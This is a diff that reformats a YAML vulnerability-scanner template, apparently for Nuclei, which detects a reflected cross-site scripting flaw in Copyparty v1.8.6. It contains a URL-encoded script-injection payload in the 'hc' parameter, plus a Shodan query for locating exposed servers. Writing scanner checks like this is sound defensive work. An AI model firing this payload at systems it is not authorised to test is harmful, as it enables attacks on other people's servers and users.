@@ -1,5 +1,4 @@
 id: copyparty-xss
-
 info:
   name: Copyparty v1.8.6 - Cross-Site Scripting
   author: theamanrawat
@@ -9,32 +8,30 @@ info:
   remediation: Upgrade to the latest version to mitigate this vulnerability.
   reference:
     - https://github.com/9001/copyparty/security/advisories/GHSA-cw7j-v52w-fp5r
+  classification:
+    cwe-id:
+      - CWE-80
   metadata:
-    verified: true
     max-request: 1
     shodan-query: title:"copyparty"
-  tags: copyparty,xss,vuln
-
+    verified: true
+  tags: copyparty,vuln,xss
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/?hc=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"
-
-    matchers-condition: and
-    matchers:
-      - type: word
+  - matchers:
+      - condition: and
         part: body
+        type: word
         words:
-          - '<a href="/"><script>alert(document.domain)</script>'
-          - 'choose your OS'
-        condition: and
-
-      - type: word
-        part: header
+          - <a href="/"><script>alert(document.domain)</script>
+          - choose your OS
+      - part: header
+        type: word
         words:
-          - 'text/html'
-
-      - type: status
-        status:
+          - text/html
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/?hc=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
